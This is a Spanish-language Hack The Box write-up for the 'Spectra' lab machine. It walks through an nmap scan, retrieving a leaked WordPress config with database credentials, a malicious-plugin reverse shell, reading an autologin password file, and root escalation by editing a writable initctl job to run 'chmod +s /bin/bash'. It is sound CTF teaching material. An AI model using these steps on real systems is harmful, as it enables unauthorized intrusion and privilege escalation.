---
title: "Spectra"
description: "Writeup de la máquina Spectra de HTB"
date: 2020-10-06T08:49:55+00:00
draft: false
menu:
  writeups:
    parent: "Máquinas"
---

Como siempre, partiremos enumerando las cosas que viven en la máquina:

sudo nmap -sS -sC -sV 10.10.10.229

tarting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 17:10 EDT
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 17:11 (0:00:12 remaining)
Stats: 0:01:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 17:12 (0:00:31 remaining)
Nmap scan report for 10.10.10.229
Host is up (0.19s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http    nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql?
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 211.06 seconds

Nada muy interesante. Exploramos el puerto 80 en más detalle y encontramos que los links van a spectra.htb. Por comodidad lo agregaremos a nuestro host

Encontramos un directorio de testing con un par de archivos interesantes. La mayoría son archivos php, por lo que si los abrimos se van a ejecutar, pero hay uno .php.save, que podemos rescatar con curl:

curl http://spectra.htb/testing/wp-config.php.save                             2 ⨯

```php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'dev' );

/** MySQL database username */
define( 'DB_USER', 'devtest' );

/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

Con eso tenemos db, dbuser y dbpassword

Con eso podemos darnos cuenta de que la password que se usa para la base de datos es la misma que se usa para el sitio wordpress.

Después de un rato probando encontramos la página para logearnos: http://spectra.htb/main/wp-login.php

Tenemos dos opciones para obtener una shell reversa. Haremos las dos, pues ambas nos sirven en caso de estar en un CTF. Hay una que es más automática, pero es bueno también tener la otra para entender un poco más lo que estamos haciendo.

## Reverse shell

Es bien fácil buscar en internet "wordpress reverse shell", y encontramos varios resultados rápidamente, por ejemplo: https://www.hackingarticles.in/wordpress-reverse-shell/

### Método 1: subida de script a mano

Usamos el plugin malicioso de wordpress que sale en el link anterior y obtenemos una shell reversa en meterpreter.
shell
python3 -c "import pty;pty.spawn('/bin/bash')"

hacemos whoami y vemos que somos nginx

después hacemos ls -l /home y vemos users posibles, lo que podemos confirmar haciendo `cat /etc/passwd`

Después de un poco de enumeración (manual), encontramos el archivo /opt/autologin.conf.orig

cat autologin.conf.orig
```shell
# Copyright 2016 The Chromium OS Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.
description   "Automatic login at boot"
author        "chromium-os-dev@chromium.org"
# After boot-complete starts, the login prompt is visible and is accepting
# input.
start on started boot-complete
script
  passwd=
  # Read password from file. The file may optionally end with a newline.
  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
    if [ -e "${dir}/passwd" ]; then
      passwd="$(cat "${dir}/passwd")"
      break
    fi
  done
  if [ -z "${passwd}" ]; then
    exit 0
  fi
  # Inject keys into the login prompt.
  #
  # For this to work, you must have already created an account on the device.
  # Otherwise, no login prompt appears at boot and the injected keys do the
  # wrong thing.
  /usr/local/sbin/inject-keys.py -s "${passwd}" -k enter
```

Lo que hace este script es buscar contraseñas en el archivo `/etc/autologin/passwd` y pasárselas a un script de python. Si revisamos ese archivo encontramos que tiene una sola línea: la password de katie. Con eso procedemos a conectarnos por ssh.

## Acceso root

Partimos haciendo enumeración a mano. Primero, vemos qué comandos podemos correr con sudo.

```
katie@spectra ~ $ sudo -l
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
```

Los scripts de jobs de initctl en general están en la carpeta `/etc/init`. Al hacer `ls -la` ahí, vemos que hay scripts de tests sobre los que tenemos privilegios de escritura. El resultado: podemos correr scripts con privilegios de superuser. Aprovecharemos de hacerlo para poder correr bash en modo privilegiado:


```shell
katie@spectra /etc/init $ cat test.conf
description "Test node.js server"
author      "katie"

start on filesystem or runlevel [2345]
stop on shutdown

script

    export HOME="/srv"
    echo $$ > /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script

pre-start script
    echo "[`date`] Node Test Starting" >> /var/log/nodetest.log
end script

pre-stop script
    rm /var/run/nodetest.pid
    echo "[`date`] Node Test Stopping" >> /var/log/nodetest.log
end script
podemos modificar el script (que corre como sudo) para que ejecutemos un programa como la persona que lo creó, usando chmod +s: If someone else runs the file, they will run the file as the user/group who created it.
```

Dejamos en el archivo

```
script

chmod +s /bin/bash

end script
```

Y después hacemos /bin/bash -p y ganamos!